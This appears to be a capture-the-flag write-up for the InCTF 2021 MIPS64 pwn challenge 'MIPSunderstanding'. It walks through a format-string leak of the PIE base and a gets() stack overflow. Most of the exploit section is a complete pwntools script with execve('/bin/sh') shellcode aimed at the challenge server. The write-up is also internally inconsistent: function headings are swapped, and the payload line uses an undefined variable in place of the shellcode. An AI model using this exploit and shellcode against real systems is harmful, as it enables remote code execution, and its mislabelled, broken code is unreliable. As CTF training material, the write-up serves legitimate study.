---
title: InCTF Nationals 2021
date: 2022-01-10T12:56:17.647Z
draft: false
featured: false
image:
  filename: featured
  focal_point: Smart
  preview_only: false
---
> - - -
>
> # MIPSunderstanding
>
> - - -

> ![](https://i.imgur.com/qUtdCzM.png "MIPSunderstanding")

> # Checksec
>
> - - -

```yaml
    Arch:     mips-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

> # Overview
>
> - - -

```yaml
chall: ELF 64-bit LSB pie executable, MIPS, MIPS-III version 1 (SYSV), dynamically linked, with debug_info, not stripped
```

![enter image description here](https://imgur.com/21z6F5S.png)
I dont know mips assembly and i solved it without understanding mips :)) . It's an easy challenge. Lets open the binary in ghidra and analyse the binary. Well there's alot of junk code in it so ill straight up show you the `thiago` and `keita` function.

### thiago

```c
void keita(void)

{
  char price [520];
  undefined *GP;
  
  GP = &_gp;
  puts("Loading .........");
  sleep(3);
  puts("+---------------------------------------+\n");
  puts("Naby Keita has been selected to get transfered.");
  sleep(5);
  puts("Leicester has offered 46 mil for Naby Keita.");
  puts("Enter the price you are willing to offer !!");
  scanf("%512s",price);
  puts("The Price has been set to \n");
  printf(price); // FMT bug here we can use to leak PIE
  puts("\nProcess Over !!");
  puts("+---------------------------------------+\n");
  return;
}
```

### klopp

```c
void thiago(void)

{
  char price [24];
  undefined *GP;
  
  GP = &_gp;
  puts("Loading .........");
  sleep(3);
  puts("Thiago Alcantara has been selected to get transfered. \n");
  sleep(5);
  puts("+---------------------------------------+\n");
  puts("Real Madrid has offered 27 mil for Thiago Alcantara.\n");
  sleep(1);
  puts("Enter the price you are willing to offer !!\n");
  gets(price); // stack buffer overflow
  puts("The Price has been set to \n");
  printf("%s",price);
  sleep(2);
  puts("\nProcess Over !!");
  puts("+---------------------------------------+\n");
  return;
}
```

Now lets dive into exploitation. But the most important part is to setup an debug environment for mips.

> # Setting up the debug environment
>
> - - -

I always use this template given by [X3eRo0](https://twitter.com/X3eRo0)  to debug different arch pwn challenges

```python
#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfinit

from rootkit import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')
context.arch = 'mips'
context.bits = 64
context.endian = 'little'
context.terminal = ["tilix","-a","session-add-right","-e"]
context.delete_corefiles = True
context.rename_corefiles = False

gdbscript = '''
target remote 0.0.0.0:1324
'''
exploit=b""
if args.GDB:
    io = process(["./qemu-mips64el", "-g", "1324", exe.path])
    if os.fork() == 0:
        a = open("/tmp/gdb.gdb", "w")
        a.write(gdbscript)
        a.close()
        cmd = " ".join(context.terminal) + " gdb-multiarch %s -x /tmp/gdb.gdb" % exe.path
        os.system(cmd)
        os.kill(os.getpid(), 9)

else:
    io=remote("gc1.eng.run", "32113")
io.interactive()
```

so with this `expl.py` you can debug the pwn challenge easily.

![debug-setup](https://imgur.com/arvqUwR.png)
Also one more thing to mention here

```yaml
# pwndbg checksec command outside qemu  
    Arch:     mips-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

```yaml
# gef checksec command inside qemu
gef➤  checksec
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : ✘ 
```

**NX is actually disabled inside qemu**. To enable NX you have to patch the qemu binary.
NOTE: use gdb-gef instead of pwndbg because pwndbg has alot of issues when it comes to weird architectures.

Lets start to build exploit.

> # Exploit
>
> - - -

1. Use the `thiago` function to leak pie address
2. Use the `klopp` function to overflow the stack and return to your shellcode

```python
#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfinit

import os
import time
from rootkit import *
import binascii
import requests

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')
context.arch = 'mips'
context.bits = 64
context.endian = 'little'
context.terminal = ["tilix","-a","session-add-right","-e"]
context.delete_corefiles = True
context.rename_corefiles = False

gdbscript = '''
target remote 0.0.0.0:1324
'''
exploit="A"*512
if args.GDB:
    io = process(["./qemu-mips64el", "-g", "1324", exe.path])
    if os.fork() == 0:
        a = open("/tmp/gdb.gdb", "w")
        a.write(gdbscript)
        a.close()
        cmd = " ".join(context.terminal) + " gdb-multiarch %s -x /tmp/gdb.gdb" % exe.path
        os.system(cmd)
        os.kill(os.getpid(), 9)

else:
    io=remote("gc1.eng.run", "32113")

reu(b"+---------------------------------------+\n")
reu(b"+---------------------------------------+\n")
sl(b"A")
sleep_(5)
reu(b"Enter the price you are willing to offer !!\n")
sl(b"%1$p")
sleep_(5)
main=int(GetInt()[0])-0x18240b4
exe.address = main-exe.sym.main
shellcode_addr=exe.address+0x1827d80+0x30
info(f"Pie base : {hex(exe.address)}")
info(f"Shellcode: {hex(shellcode_addr)}")
sl(b"1")
re()
sl(b"C")
padding=b"A"*32
rop = flat([
    padding,
    0xdeadbeef,
    shellcode_addr,
])
sleep_(5)
re()
shellcode =  b""
shellcode += b"\x62\x69\x0c\x3c"
shellcode += b"\x2f\x2f\x8c\x35"
shellcode += b"\xf4\xff\xac\xaf"
shellcode += b"\x73\x68\x0d\x3c"
shellcode += b"\x6e\x2f\xad\x35"
shellcode += b"\xf8\xff\xad\xaf"
shellcode += b"\xfc\xff\xa0\xaf"
shellcode += b"\xf4\xff\xa4\x67"
shellcode += b"\xff\xff\x05\x28"
shellcode += b"\xff\xff\x06\x28"
shellcode += b"\xc1\x13\x02\x24"
shellcode += b"\x0c\x01\x01\x01"

# https://www.exploit-db.com/exploits/45287

sl(rop + b"\x00\x00\x00\x00"*32 + s) # \x00\x00\x00\x00 is nops in mips64
sleep_(5)
reu(b"+---------------------------------------+\n")
io.interactive()
```

[![asciicast](https://asciinema.org/a/460943.svg)](https://asciinema.org/a/460943) 

> InCTF{w3_sh4ll_not_b3_m0v3D_132244345}